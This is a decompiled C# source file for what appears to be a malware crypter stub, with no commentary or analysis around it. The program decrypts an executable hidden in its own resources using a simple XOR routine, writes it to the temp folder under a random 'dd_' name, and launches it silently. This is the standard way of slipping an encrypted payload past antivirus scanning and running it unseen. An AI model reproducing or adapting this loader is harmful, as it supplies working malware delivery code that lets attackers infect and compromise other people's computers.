using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace oOstub;

[StandardModule]
internal sealed class Module1
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	[STAThread]
	public static void Main()
	{
		string text = Decrypt(Encoding.Default.GetString(ResourceReader.ReadResource(10, "1", 0)), Encoding.Default.GetString(ResourceReader.ReadResource(10, "0", 0)));
		string text2 = Conversions.ToString(GenStr(10L));
		FileSystem.FileOpen(1, Environment.GetEnvironmentVariable("temp") + "\\dd_" + text2 + ".exe", (OpenMode)32, (OpenAccess)2, (OpenShare)(-1), -1);
		FileSystem.FilePut(1, text, -1L, false);
		FileSystem.FileClose(new int[1] { 1 });
		Process.Start(Environment.GetEnvironmentVariable("temp") + "\\dd_" + text2 + ".exe");
	}

	public static object GenStr(long len)
	{
		Random random = new Random();
		string text = "abcdefghijklmnopqrstuvwxyz";
		string text2 = null;
		for (long num = 0L; num <= len; num = checked(num + 1L))
		{
			text2 += Conversions.ToString(text[random.Next(text.Length)]);
		}
		return text2;
	}

	public static string Decrypt(string pass, string Input)
	{
		StringBuilder stringBuilder = new StringBuilder();
		checked
		{
			int num = Input.Length - 1;
			int num2 = default(int);
			for (int i = 0; i <= num; i += 2)
			{
				string value = Conversions.ToString(Strings.Chr((int)(Conversions.ToLong("&H" + Input.Substring(i, 2)) ^ Strings.Asc(pass[num2]))));
				stringBuilder.Append(value);
				num2 = ((num2 != pass.Length - 1) ? (num2 + 1) : 0);
			}
			return stringBuilder.ToString();
		}
	}
}
